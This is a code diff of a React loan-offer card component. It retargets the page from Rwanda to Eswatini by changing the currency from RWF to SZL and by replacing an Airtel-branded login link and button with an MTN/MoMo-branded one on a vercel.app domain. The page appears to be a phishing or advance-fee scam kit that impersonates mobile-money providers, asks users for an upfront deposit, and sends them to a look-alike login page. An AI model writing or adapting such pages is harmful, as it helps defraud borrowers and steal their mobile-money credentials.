@@ -6,7 +6,7 @@ import { CalendarDays, CheckCircle2, ShieldCheck, X } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { type Offer, totalPrice } from "@/lib/products"
 
-const LOGIN_URL = "https://airtel-fastloan.vercel.app/"
+const LOGIN_URL = "https://mtnfast.vercel.app/"
 
 export function OfferCard({ offer }: { offer: Offer }) {
   const [open, setOpen] = useState(false)
@@ -52,7 +52,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                 Deposit
               </dt>
               <dd className="mt-0.5 font-display text-small-small font-bold text-secondary-foreground">
-                {offer.deposit} RWF
+                {offer.deposit} SZL
               </dd>
             </div>
             <div className="rounded-xl bg-primary/10 p-3">
@@ -60,17 +60,17 @@ export function OfferCard({ offer }: { offer: Offer }) {
                 Per day
               </dt>
               <dd className="mt-0.5 font-display text-small font-bold text-primary">
-                {offer.daily.toFixed(2)} RWF
+                {offer.daily.toFixed(2)} SZL
               </dd>
             </div>
           </dl>
 
           <p className="text-sm text-muted-foreground">
             Pay{" "}
-            <span className="text-small text-foreground">{offer.deposit} RWF</span>{" "}
+            <span className="text-small text-foreground">{offer.deposit} SZL</span>{" "}
             today, then{" "}
             <span className="font-medium text-foreground">
-              {offer.daily.toFixed(2)} RWF/day 
+              {offer.daily.toFixed(2)} SZL/day 
             </span>{" "}
             for {days.toLocaleString()} days.
           </p>
@@ -85,7 +85,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                 })}
                 {offer.estimated ? "*" : ""}
               </p>
-              RWF
+              SZL
             </div>
             <Button
               size="sm"
@@ -142,7 +142,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                     minimumFractionDigits: 0,
                     maximumFractionDigits: 0,
                   })}
-                  {offer.estimated ? "*" : ""}{" "} RWF 
+                  {offer.estimated ? "*" : ""}{" "} SZL 
                   <span className="font-normal text-muted-foreground">
                     total
                   </span>
@@ -157,7 +157,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                     Deposit today
                   </p>
                   <p className="mt-0.5 font-display text-xl font-bold text-secondary-foreground">
-                    {offer.deposit} RWF
+                    {offer.deposit} SZL
                   </p>
                 </div>
                 <div className="rounded-xl bg-primary/10 p-3">
@@ -165,7 +165,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                     Daily payment
                   </p>
                   <p className="mt-0.5 font-display text-xl font-bold text-primary">
-                    {offer.daily.toFixed(2)} RWF
+                    {offer.daily.toFixed(2)} SZL
                   </p>
                 </div>
               </div>
@@ -185,7 +185,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                     {(offer.daily * days).toLocaleString(undefined, {
                       minimumFractionDigits: 0,
                       maximumFractionDigits: 0,
-                    })} RWF
+                    })} SZL
                   </span>
                 </li>
               </ul>
@@ -195,7 +195,7 @@ export function OfferCard({ offer }: { offer: Offer }) {
                 className="flex w-full items-center justify-center gap-2 rounded-full bg-primary px-5 py-3 text-sm font-semibold text-primary-foreground transition-opacity hover:opacity-90"
               >
                 <ShieldCheck className="size-4" />
-                Continue with Airtel to check Eligibility
+                Continue with MOMO to check Eligibility
               </a>
 
               <p className="flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
